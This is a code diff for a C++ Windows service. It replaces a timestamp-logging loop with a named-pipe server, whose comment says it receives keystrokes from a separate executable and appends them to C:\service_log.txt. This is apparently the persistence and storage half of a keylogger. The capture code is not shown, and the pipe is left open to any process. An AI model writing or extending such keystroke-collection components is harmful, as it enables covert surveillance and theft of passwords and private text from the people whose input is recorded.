@@ -1,9 +1,10 @@
- #include <windows.h>
+#include <windows.h>
 #include <tchar.h>
 #include <iostream>
 
 SERVICE_STATUS ServiceStatus;
 SERVICE_STATUS_HANDLE hStatus;
+#define PIPE_NAME L"\\\\.\\pipe\\MyPipe" // \\.\pipe\ is a special namespace for named pipes in Windows. "MyPipe" is the actual name.
 
 // Forward declarations
 void ServiceMain(int argc, char **argv);
@@ -119,10 +120,10 @@ bool StartServiceByName()
     return true;
 }
 
-int main(int argc, char* argv[])
+int main(int argc, char *argv[])
 {
-    
-    if (argc > 1) 
+
+    if (argc > 1)
     {
         // Handle installer/uninstaller logic if user runs "MyService.exe install"
         if (strcmp(argv[1], "install") == 0)
@@ -145,7 +146,7 @@ int main(int argc, char* argv[])
 
     // If no arguments: assume SCM is starting us
     SERVICE_TABLE_ENTRY ServiceTable[] = {
-        {(LPSTR)"MyService", (LPSERVICE_MAIN_FUNCTION)ServiceMain},
+        {(LPSTR) "MyService", (LPSERVICE_MAIN_FUNCTION)ServiceMain},
         {NULL, NULL}};
 
     if (!StartServiceCtrlDispatcher(ServiceTable))
@@ -156,15 +157,13 @@ int main(int argc, char* argv[])
     return 0;
 }
 
-
 //-------------------------------------
 // Service main function
 //-------------------------------------
 void ServiceMain(int argc, char **argv)
 {
-    ServiceStatus.dwServiceType = SERVICE_WIN32;
+    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
     // Specifies that this is a standard Win32 service (not a driver).
-    // Other types exist, e.g., kernel drivers, but SERVICE_WIN32 is the usual type for background apps.
 
     ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
     // Tells SCM that the service is starting up.
@@ -183,7 +182,7 @@ void ServiceMain(int argc, char **argv)
         return;
 
     ServiceStatus.dwCurrentState = SERVICE_RUNNING;
-    SetServiceStatus(hStatus, &ServiceStatus);   // SetServiceStatus is a Windows API function that updates the service control manager with the current status of a service.
+    SetServiceStatus(hStatus, &ServiceStatus); // SetServiceStatus is a Windows API function that updates the service control manager with the current status of a service.
 
     ServiceWork(); // Start background task
 }
@@ -195,14 +194,72 @@ void ControlHandler(DWORD request)
 {
     switch (request)
     {
-    case SERVICE_CONTROL_STOP:     // "net stop MyService" or Services.msc Stop
-    case SERVICE_CONTROL_SHUTDOWN:     // System is shutting down
-        ServiceStatus.dwCurrentState = SERVICE_STOPPED;     // Update status to STOPPED
-        SetServiceStatus(hStatus, &ServiceStatus);       // Tell Windows we're stopped
-        exit(0);           // Terminate the service process
-        break; 
+    case SERVICE_CONTROL_STOP:                          // "net stop MyService" or Services.msc Stop
+    case SERVICE_CONTROL_SHUTDOWN:                      // System is shutting down
+        ServiceStatus.dwCurrentState = SERVICE_STOPPED; // Update status to STOPPED
+        SetServiceStatus(hStatus, &ServiceStatus);      // Tell Windows we're stopped
+        exit(0);                                        // Terminate the service process
+        break;
     default:
         break;
+    }
+}
+
+//-------------------------------------
+// write to file
+//-------------------------------------
+
+void WritetoFile(const char *buffer)
+{
+
+    FILE *f = fopen("C:\\service_log.txt", "a");
+
+    if (f)
+    {
+        fputs(buffer, f);
+        fclose(f);
+    }
+}
+
+//-------------------------------------
+// pipeline to comunicate with the exe to get the keystrokes
+//-------------------------------------
+void RunPipeServer()
+{
+
+    HANDLE hPipe = CreateNamedPipeW(
+        PIPE_NAME,
+        PIPE_ACCESS_INBOUND,        // Service only reads. this end can only read (good for service).
+        PIPE_TYPE_BYTE | PIPE_WAIT, // Type of data & how operations are handled.   PIPE_TYPE_BYTE → data is treated as a stream of bytes (like a file). PIPE_WAIT → blocking mode (waits until data arrives).
+        1,                          // Max instances
+        0,                          // Out buffer (not needed)
+        16,                         // In buffer
+        0,                          // Time (in ms) the server waits for a client to read datA
+        NULL                        // NULL (security attributes) You’d set this if you wanted to control who can access the pipe.
+    );
+
+    if (hPipe == INVALID_HANDLE_VALUE)
+    {
+        std::wcerr << L"CreateNamedPipe failed, error " << GetLastError() << std::endl;
+        return;
+    }
+
+    std::wcout << L"[Service] Waiting for client connection...\n";
+    BOOL connected = ConnectNamedPipe(hPipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
+
+    if (connected)
+    {
+        std::wcout << L"[Service] Client connected!\n";
+        char buffer[16];
+        DWORD bytesRead;
+
+        while (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL))
+        {
+            buffer[bytesRead] = '\0';
+            std::cout << "[Service] Received: " << buffer << std::endl;
+
+            WritetoFile(buffer);
+        }
     }
 }
 
@@ -211,21 +268,5 @@ void ControlHandler(DWORD request)
 //-------------------------------------
 void ServiceWork()
 {
-    while (1)
-    {
-        SYSTEMTIME st;
-        GetLocalTime(&st);
-
-        char buffer[100];
-        sprintf(buffer, "Service running at %02d:%02d:%02d\n", st.wHour, st.wMinute, st.wSecond);
-        FILE *f = fopen("C:\\service_log.txt", "a");
-        if (f)
-        {
-            fputs(buffer, f);
-            fclose(f);
-        }
-
-        Sleep(10000); // 10 seconds
-    }
+    RunPipeServer();
 }
-
